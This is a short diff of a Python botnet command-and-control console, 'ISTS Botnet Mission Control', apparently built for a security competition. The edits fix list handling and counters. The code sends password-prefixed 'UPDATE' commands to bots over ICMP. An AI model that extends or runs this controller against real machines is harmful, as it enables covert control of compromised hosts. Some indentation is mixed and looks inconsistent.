@@ -4,14 +4,14 @@ import Queue
 
 PASSWORD="OkayNowYouCanUseMe"
 traffic = Queue.Queue()
-activeBots = []
 
 
 def main():
 	print(" - ISTS Botnet Mission Control - ")
     	print("\tHELP - to list commands")
 	targets = []
-    	listener = Listener(traffic)
+	activeBots = [] 
+   	listener = Listener(traffic)
 	listener.start()
 	expecting = False
 	show = True
@@ -32,14 +32,15 @@ def main():
 					print("Invalid format. <CMD>:Arg")
 			elif cmd.startswith("SHOW-TARGETS"):
 				if len(targets) > 0:
-					counter = 0
+					counter = 1
 					for target in targets:
 						print("!"+str(counter)+": "+str(target))
+						counter += 1
 				else:
 					print("No targets selected")
 			elif cmd.startswith("SHOW-BOTS"):
 				if len(activeBots) > 0:
-					counter = 0
+					counter = 1
 					for bot in activeBots:
 						print("$"+str(counter)+": "+str(bot))
 						counter += 1
@@ -50,7 +51,7 @@ def main():
 				for bot in activeBots:
 					send_icmp(localhost, bot, PASSWORD+"UPDATE")
 				expecting = True
-				activeBots.clear()	
+				del activeBots[:]	
 			elif cmd.startswith("SET-RESPONSES"):
 				if cmd.split(":")[1] == "OFF":
 					show = True
